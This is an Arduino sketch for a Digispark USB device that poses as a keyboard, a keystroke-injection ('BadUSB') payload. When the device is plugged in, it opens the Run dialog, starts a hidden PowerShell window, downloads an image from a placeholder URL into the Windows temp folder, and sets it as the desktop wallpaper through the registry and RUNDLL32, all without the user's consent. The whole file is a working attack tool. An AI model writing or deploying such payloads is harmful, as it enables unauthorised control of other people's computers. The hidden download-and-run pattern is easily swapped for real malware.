// Author : thewhiteh4t //
#include "DigiKeyboard.h"
void setup() {
	pinMode(1, OUTPUT);
}
void loop() {
	DigiKeyboard.delay(3000);
	DigiKeyboard.sendKeyStroke(0);
 	DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 	DigiKeyboard.delay(300);
 	DigiKeyboard.print("powershell -windowstyle hidden"); 
  	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1000);
	DigiKeyboard.print("iwr -Uri URL -OutFile C:/windows/temp/b.jpg;sp 'HKCU:Control Panel/Desktop' WallPaper 'C:/windows/temp/b.jpg';RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 5");
  	DigiKeyboard.sendKeyStroke(KEY_ENTER);
  	digitalWrite(1, HIGH);
  	DigiKeyboard.delay(90000);
  	digitalWrite(1, LOW);
  	DigiKeyboard.delay(5000);
}
